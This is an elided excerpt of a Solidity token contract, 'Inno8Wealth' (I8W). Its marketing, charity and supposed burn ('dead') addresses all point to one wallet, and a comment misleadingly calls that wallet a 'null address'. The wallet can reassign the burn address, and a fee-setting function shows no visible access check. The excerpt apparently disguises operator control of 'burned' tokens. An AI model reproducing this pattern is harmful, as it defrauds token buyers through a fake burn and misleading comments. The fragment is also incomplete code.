...
contract Inno8Wealth is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xD4782E3C916d8DA82FfCBc7Aa14875D77b04b502); // operator
    address payable public charityAddress = payable(0xD4782E3C916d8DA82FfCBc7Aa14875D77b04b502); // null address
    
    address  public  deadAddress = 0xD4782E3C916d8DA82FfCBc7Aa14875D77b04b502;
    ...
    string private _name = "Inno8Wealth";  // name here
    string private _symbol = "I8W"; // symbol here
  ...
  function setALLFeePercent(uint256 charity,uint256 marketting,uint256 burnTaxFee,uint256 liquidityFee,uint256 taxFee,uint256 sellLiquidityFee,uint256 sellTaxFee,uint256 buyLiquidityFee,uint256 buyTaxFee) external   {
    ...
    function setburnaddress(address _marketingAddress1) external  {
        require(msg.sender == marketingAddress, "homestead");
        deadAddress = payable(_marketingAddress1);
    }
